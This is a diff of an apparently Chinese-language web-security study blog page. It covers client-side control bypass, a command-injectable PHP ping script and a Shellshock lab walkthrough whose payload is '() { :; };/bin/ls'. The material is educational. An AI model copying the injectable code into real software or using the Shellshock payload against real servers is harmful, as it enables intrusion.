@@ -261,7 +261,7 @@ if (!doNotTrack) {
 
 
                 <time class="article-time--reading">
-                    5 minute read
+                    6 minute read
                 </time>
             </div>
         
@@ -288,23 +288,56 @@ if (!doNotTrack) {
 <li>
 <p>URL parameters URL参数 <!-- raw HTML omitted -->
 URL后面接的GET参数可以被轻易修改 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://example.com/shop/?prod=3&amp;price=32&amp;currency=USD
-</span></span></code></pre></div></li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://example.com/shop/?prod=3&amp;price=32&amp;currency=USD
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 <li>
 <p>Hidden form fields 隐藏的表格内容 <!-- raw HTML omitted -->
 有些网页会有隐藏的表单内容用于后续的提交，这些表格可以轻易被浏览器的开发工具所修改，因此服务器端也得对这部分的数据做严格的审核 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Please enter the required quantity:<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Please enter the required quantity:<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
 </span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;post&#34;</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;Shop.aspx?prod=1&#34;</span><span class="p">&gt;</span> 
 </span></span><span class="line"><span class="cl">Product: xPhone Ultimate <span class="p">&lt;</span><span class="nt">br</span><span class="p">/&gt;</span> Price: 449 <span class="p">&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>
 </span></span><span class="line"><span class="cl">(Maximum quantity is 50)<span class="p">&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>  
 </span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;price&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;449&#34;</span><span class="p">&gt;</span> 
 </span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Buy&#34;</span><span class="p">&gt;</span> 
 </span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-</span></span></code></pre></div></li>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 <li>
 <p>Length limits 长度限制 <!-- raw HTML omitted -->
 长度的限制也可以轻易被修改 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Please enter the required quantity:<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Please enter the required quantity:<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
 </span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;post&#34;</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;Shop.aspx?prod=1&#34;</span><span class="p">&gt;</span> 
 </span></span><span class="line"><span class="cl">Product: iPhone Ultimate <span class="p">&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>
 </span></span><span class="line"><span class="cl">Price: 449 <span class="p">&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>
@@ -313,22 +346,56 @@ URL后面接的GET参数可以被轻易修改 <!-- raw HTML omitted --></p>
 </span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">”hidden”</span> <span class="na">name</span><span class="o">=</span><span class="s">”price”</span> <span class="na">value</span><span class="o">=</span><span class="s">”449”</span><span class="p">&gt;</span> 
 </span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">”submit”</span> <span class="na">value</span><span class="o">=</span><span class="s">”Buy”</span><span class="p">&gt;</span>
 </span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-</span></span></code></pre></div></li>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 <li>
 <p>Disabled elements 不可修改的元素 <!-- raw HTML omitted -->
 开发者工具修改 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Please enter the required quantity:<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Please enter the required quantity:<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
 </span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;post&#34;</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;Shop.aspx?prod=1&#34;</span><span class="p">&gt;</span> 
 </span></span><span class="line"><span class="cl">Product: iPhone Ultimate <span class="p">&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>
 </span></span><span class="line"><span class="cl">Price: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;price&#34;</span> <span class="na">disabled</span><span class="o">=</span><span class="s">&#34;true&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;449&#34;</span><span class="p">&gt;</span>
 </span></span><span class="line"><span class="cl">Quantity: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;quantity&#34;</span><span class="p">&gt;</span>(Maximum quantity is 50) <span class="p">&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>
 </span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Buy&#34;</span><span class="p">&gt;</span>
 </span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-</span></span></code></pre></div></li>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 <li>
 <p>Script-based validation <!-- raw HTML omitted -->
 前端的JS脚本检查，可以通过debugger，Burp抓住请求后直接修改，chrome可以直接修改 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;post&#34;</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;Shop.aspx?prod=2&#34;</span> <span class="na">onsubmit</span><span class="o">=</span><span class="s">&#34;return validateForm(this)&#34;</span><span class="p">&gt;</span> 
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;post&#34;</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;Shop.aspx?prod=2&#34;</span> <span class="na">onsubmit</span><span class="o">=</span><span class="s">&#34;return validateForm(this)&#34;</span><span class="p">&gt;</span> 
 </span></span><span class="line"><span class="cl">Product: Samsung Multiverse <span class="p">&lt;</span><span class="nt">br</span><span class="p">/&gt;</span> 
 </span></span><span class="line"><span class="cl">Price: 399 <span class="p">&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>
 </span></span><span class="line"><span class="cl">Quantity: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;quantity&#34;</span> <span class="err">(</span><span class="na">Maximum</span> <span class="na">quantity</span> <span class="na">is</span> <span class="na">50</span><span class="err">)</span> <span class="err">&lt;</span><span class="na">br</span><span class="p">/&gt;</span> 
@@ -343,24 +410,47 @@ URL后面接的GET参数可以被轻易修改 <!-- raw HTML omitted --></p>
 </span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="nx">valid</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span> 
 </span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span></code></pre></div></li>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 <li>
 <p>Referer header <!-- raw HTML omitted -->
 Burp拦截请求后可以直接修改 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET /auth/472/CreateUser.ashx HTTP/1.1 
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET /auth/472/CreateUser.ashx HTTP/1.1 
 </span></span><span class="line"><span class="cl">Host: mdsec.net 
 </span></span><span class="line"><span class="cl">Referer: https://mdsec.net/auth/472/Admin.ashx
-</span></span></code></pre></div></li>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 <li>
 <p>HTTP cookies <!-- raw HTML omitted -->
 Burp拦截请求后可以直接修改 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /shop/92/Shop.aspx?prod=3 HTTP/1.1 
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /shop/92/Shop.aspx?prod=3 HTTP/1.1 
 </span></span><span class="line"><span class="cl">Host: mdsec.net 
 </span></span><span class="line"><span class="cl">Cookie: DiscountAgreed=25 
 </span></span><span class="line"><span class="cl">Content-Length: 10
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">quantity=1
-</span></span></code></pre></div></li>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 </ol>
 <h3 id="local-remote-file-inclusion--lfi-rfi--文件包含">Local/Remote File Inclusion (LFI/RFI) 文件包含</h3>
 <p>详见：<a class="link" href="https://ginkgo.org.cn/posts/lrfi_basic/"  target="_blank" rel="noopener"
@@ -369,11 +459,21 @@ Burp拦截请求后可以直接修改 <!-- raw HTML omitted --></p>
 <p>命令行注入漏洞主要由黑客利用PHP中来执行系统命令的函数来执行自己的恶意代码(e.g., system(), exec(),  popen()). <!-- raw HTML omitted --></p>
 <p>参数通常由POST or GET参数传入 <!-- raw HTML omitted --></p>
 <p>例如我们有一个ping.php需要传入一个GET参数来测试一个host的ping连接，但是如果我们用 <code>‘;’</code> 拼接这个ping指令，就可以执行额外的操作 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
 </span></span><span class="line"><span class="cl">    <span class="nv">$host</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl">    <span class="nx">system</span><span class="p">(</span><span class="s1">&#39;ping -c 4 &#39;</span><span class="o">.</span><span class="nv">$host</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
-</span></span></span></code></pre></div><p><figure><img src="/ox-hugo/2022-05-22_10-13-15_screenshot.png" width="700px"/>
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><img src="/ox-hugo/2022-05-22_10-13-15_screenshot.png" width="700px"/>
 </figure>
  <!-- raw HTML omitted --></p>
 <h3 id="shellshock">Shellshock</h3>
@@ -386,7 +486,20 @@ Burp拦截请求后可以直接修改 <!-- raw HTML omitted --></p>
 <ol>
 <li>
 <p>普通shell变量和bash子进程中的变量 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:26<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nv">gu</span><span class="o">=</span><span class="s2">&#34;hacker&#34;</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:26<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nv">gu</span><span class="o">=</span><span class="s2">&#34;hacker&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:26<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nb">echo</span> <span class="nv">$gu</span>
 </span></span><span class="line"><span class="cl">hacker
 </span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:26<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ bash <span class="c1">#进入子进程</span>
@@ -395,13 +508,28 @@ Burp拦截请求后可以直接修改 <!-- raw HTML omitted --></p>
 </span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:27<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nb">exit</span>
 </span></span><span class="line"><span class="cl"><span class="nb">exit</span>
 </span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:27<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$
-</span></span></code></pre></div></li>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 </ol>
 <p>结论：bash子进程没有继承普通shell的变量 <code>$gu</code> <!-- raw HTML omitted --></p>
 <ol>
 <li>
 <p>普通环境变量与bash子进程中的环境变量 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:31<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nb">echo</span> <span class="nv">$gu</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:31<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nb">echo</span> <span class="nv">$gu</span>
 </span></span><span class="line"><span class="cl">hacker
 </span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:32<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nb">export</span> gu
 </span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:32<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ bash
@@ -410,13 +538,28 @@ Burp拦截请求后可以直接修改 <!-- raw HTML omitted --></p>
 </span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:32<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nb">exit</span>
 </span></span><span class="line"><span class="cl"><span class="nb">exit</span>
 </span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:32<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$
-</span></span></code></pre></div></li>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 </ol>
 <p>结论：bash子进程继承了普通shell中定义的环境变量 <code>$gu</code> <!-- raw HTML omitted --></p>
 <ol>
 <li>
 <p>普通函数变量和bash子进程中的函数变量 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:37<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ gu<span class="o">()</span> <span class="o">{</span> <span class="nb">echo</span> <span class="s2">&#34;gu is a hacker&#34;</span><span class="p">;</span><span class="o">}</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:37<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ gu<span class="o">()</span> <span class="o">{</span> <span class="nb">echo</span> <span class="s2">&#34;gu is a hacker&#34;</span><span class="p">;</span><span class="o">}</span>
 </span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:37<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ gu
 </span></span><span class="line"><span class="cl">gu is a hacker
 </span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:38<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ bash
@@ -425,13 +568,31 @@ Burp拦截请求后可以直接修改 <!-- raw HTML omitted --></p>
 </span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:38<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nb">exit</span>
 </span></span><span class="line"><span class="cl"><span class="nb">exit</span>
 </span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:38<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$
-</span></span></code></pre></div></li>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 </ol>
 <p>结论：bash子进程没有继承函数变量 <code>gu</code> <!-- raw HTML omitted --></p>
 <ol>
 <li>
 <p>函数环境变量和bash子进程中的函数环境变量 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:41<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ gu
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:41<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ gu
 </span></span><span class="line"><span class="cl">gu is a hacker
 </span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:41<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nb">export</span> -f gu
 </span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:41<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ bash
@@ -443,7 +604,9 @@ Burp拦截请求后可以直接修改 <!-- raw HTML omitted --></p>
 </span></span><span class="line"><span class="cl"><span class="nv">gu</span><span class="o">=</span>hacker
 </span></span><span class="line"><span class="cl"><span class="nv">gu</span><span class="o">=()</span> <span class="o">{</span>  <span class="nb">echo</span> <span class="s2">&#34;gu is a hacker&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:42<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$
-</span></span></code></pre></div></li>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 </ol>
 <p>结论：bash子进程继承了函数环境变量 <code>gu</code> <!-- raw HTML omitted --></p>
 <h4 id="shellshock发生的原因">shellshock发生的原因</h4>
@@ -451,7 +614,27 @@ Burp拦截请求后可以直接修改 <!-- raw HTML omitted --></p>
 <ol>
 <li>
 <p>普通函数变量再尝试 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:42<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nv">ailx10</span><span class="o">=</span><span class="s1">&#39;() {  echo &#34;ailx10 is a hacker&#34;;}&#39;</span> <span class="c1"># 普通函数变量</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:42<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nv">ailx10</span><span class="o">=</span><span class="s1">&#39;() {  echo &#34;ailx10 is a hacker&#34;;}&#39;</span> <span class="c1"># 普通函数变量</span>
 </span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:48<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nb">export</span> -nf gu <span class="c1"># 删除环境函数变量gu</span>
 </span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:48<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nb">export</span> -n gu <span class="c1"># 删除环境变量gu</span>
 </span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:49<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nb">export</span> -f ailx10 <span class="c1"># 保存环境函数变量，失败</span>
@@ -467,13 +650,27 @@ Burp拦截请求后可以直接修改 <!-- raw HTML omitted --></p>
 </span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:50<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ env <span class="p">|</span> grep ailx10
 </span></span><span class="line"><span class="cl"><span class="nv">ailx10</span><span class="o">=()</span> <span class="o">{</span>  <span class="nb">echo</span> <span class="s2">&#34;ailx10 is a hacker&#34;</span><span class="p">;</span><span class="o">}</span>
 </span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:50<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$
-</span></span></code></pre></div></li>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 </ol>
 <p>结论：因为我们再定义函数 <code>ailx10</code> 的时候，用了 <code>(){ :; }</code> ，所以无法被识别为环境函数变量，被当作是环境变量保存了 <!-- raw HTML omitted --></p>
 <ol>
 <li>
 <p>() { :; }再尝试 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:57<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nv">ailx10</span><span class="o">=</span><span class="s1">&#39;() { :; };/bin/ls&#39;</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:57<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nv">ailx10</span><span class="o">=</span><span class="s1">&#39;() { :; };/bin/ls&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:58<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nb">export</span> ailx10 <span class="c1"># 当作环境变量保存</span>
 </span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:58<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ bash <span class="c1"># /bin/ls 作为环境变量却被执行了</span>
 </span></span><span class="line"><span class="cl">curl-7.20.0     myls      myls.c      myprog.cgi.1  readme.txt
@@ -481,7 +678,9 @@ Burp拦截请求后可以直接修改 <!-- raw HTML omitted --></p>
 </span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:58<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$ <span class="nb">exit</span>
 </span></span><span class="line"><span class="cl"><span class="nb">exit</span>
 </span></span><span class="line"><span class="cl"><span class="o">[</span>04/12/2018 09:58<span class="o">]</span> seed@ubuntu:~/Seed/shellshock$
-</span></span></code></pre></div></li>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 </ol>
 <p>至此，我们可以总结 Shellshock 漏洞产生的原因 <!-- raw HTML omitted --></p>
 <ol>
@@ -496,8 +695,15 @@ Burp拦截请求后可以直接修改 <!-- raw HTML omitted --></p>
 <p><figure><img src="/ox-hugo/2022-05-22_11-40-34_screenshot.png" width="700px"/>
     </figure>
  <!-- raw HTML omitted --></p>
